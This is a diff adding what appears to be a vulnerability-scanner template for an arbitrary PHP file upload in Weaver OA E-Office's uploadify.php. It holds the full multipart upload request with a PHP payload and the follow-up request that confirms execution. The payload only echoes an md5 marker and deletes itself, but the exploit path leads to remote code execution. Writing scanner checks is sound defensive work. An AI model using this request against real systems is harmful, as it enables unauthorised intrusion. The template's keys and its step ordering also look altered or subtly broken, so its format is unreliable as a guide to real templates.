@@ -1,0 +1,54 @@
+id: weaver-uploadify-file-upload
+brief:
+    title: OA E-Office Uploadify - Arbitrary File Upload
+    by: SleepingBag945
+    level: critical
+    about: OA E-Office Uploadify is vulnerable to arbitrary file upload.
+    label:
+        - weaver
+        - e-office
+        - oa
+        - intrusive
+        - rce
+        - fileupload
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/general/weibo/javascript/uploadify/uploadify.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_3
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/general/weibo/javascript/uploadify/uploadify.php'
+      head:
+        Accept: '*/*'
+        Accept-Encoding: gzip
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+      body: |-
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_3
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/attachment/personal/_temp.php'
+      signs:
+        - "on": word
+          has:
+            - '{{md5(string)}}'
+          in: body_3
+          need: all
